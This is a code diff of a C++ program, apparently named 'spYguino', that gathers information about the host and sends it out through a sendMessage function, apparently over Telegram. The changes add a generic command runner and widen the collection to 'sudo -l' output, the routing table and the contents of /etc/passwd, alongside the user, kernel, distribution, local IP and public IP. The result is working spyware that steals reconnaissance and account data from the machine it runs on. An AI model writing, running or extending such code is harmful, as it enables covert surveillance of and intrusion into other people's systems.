@@ -4,30 +4,14 @@
 #include <string>
 #include "tg.h"
 #include "spYguino.h"
+#include <fstream>
+#include <sstream>
 
-std::string readPublicIp()
+std::string runCommand(std::string command)
 {
     char buffer[128];
     std::string result = "";
-    FILE* pipe = popen("curl -s ifconfig.me", "r");
-    if (!pipe) throw std::runtime_error("popen() failed!");
-    try { 
-        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
-            result += buffer;
-        }
-    } catch (...) {
-        pclose(pipe);
-        throw;
-    }
-    pclose(pipe);
-    return result;
-}
-
-std::string readIp()
-{
-    char buffer[128];
-    std::string result = "";
-    FILE* pipe = popen("hostname -I", "r");
+    FILE* pipe = popen(command.c_str(), "r");
     if (!pipe) throw std::runtime_error("popen() failed!");
     try {
         while (fgets(buffer, sizeof buffer, pipe) != NULL) {
@@ -41,69 +25,30 @@ std::string readIp()
     return result;
 }
 
-std::string readDistro()
-{
-    char buffer[128];
-    std::string result = "";
-    FILE* pipe = popen("lsb_release -a 2> /dev/null", "r");
-    if (!pipe) throw std::runtime_error("popen() failed!");
-    try {
-        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
-            result += buffer;
-        }
-    } catch (...) {
-        pclose(pipe);
-        throw;
+std::string readFile(const std::string& filename) {
+    std::ifstream file(filename);
+    if (!file.is_open()) {
+        return "";
     }
-    pclose(pipe);
-    return result;
+
+    std::ostringstream buffer;
+    buffer << file.rdbuf();
+    return buffer.str();
 }
 
-std::string readKernelVersion()
-{
-    char buffer[128];
-    std::string result = "";
-    FILE* pipe = popen("uname -r", "r");
-    if (!pipe) throw std::runtime_error("popen() failed!");
-    try {
-        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
-            result += buffer;
-        }
-    } catch (...) {
-        pclose(pipe);
-        throw;
-    }
-    pclose(pipe);
-    return result;
-}
-
-std::string readUser()
-{
-    char buffer[128];
-    std::string result = "";
-    FILE* pipe = popen("whoami", "r");
-    if (!pipe) throw std::runtime_error("popen() failed!");
-    try {
-        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
-            result += buffer;
-        }
-    } catch (...) {
-        pclose(pipe);
-        throw;
-    }
-    pclose(pipe);
-    return result;
-}
 
 SystemProfile systemprofile()
 {
 
     struct SystemProfile currentProfile;
-    currentProfile.user = readUser();
-    currentProfile.kernelVersion = readKernelVersion();
-    currentProfile.distro = readDistro();
-    currentProfile.ip = readIp();
-    currentProfile.ip_publica = readPublicIp();
+    currentProfile.user = runCommand("whoami");
+    currentProfile.sudouser = runCommand("sudo -l");
+    currentProfile.tablaenrutamiento = runCommand("route");
+    currentProfile.kernelVersion = runCommand("uname -r");
+    currentProfile.distro = runCommand("lsb_release -a 2> /dev/null");
+    currentProfile.ip = runCommand("hostname -I");
+    currentProfile.ip_publica = runCommand("curl -s ifconfig.me");
+    currentProfile.etcpasswd = readFile("/etc/passwd");
     return currentProfile;
 }
 
@@ -112,10 +57,6 @@ int main(int argc, char const *argv[])
     struct SystemProfile currentProfile;
     
     currentProfile = systemprofile();
-    // std::cout << currentProfile.user << std::endl;
-    // std::cout << currentProfile.kernelVersion << std::endl;
-    // std::cout << currentProfile.distro << std::endl;
-    // std::cout << currentProfile.ip << std::endl;
     sendMessage(currentProfile);
     
     return 0;
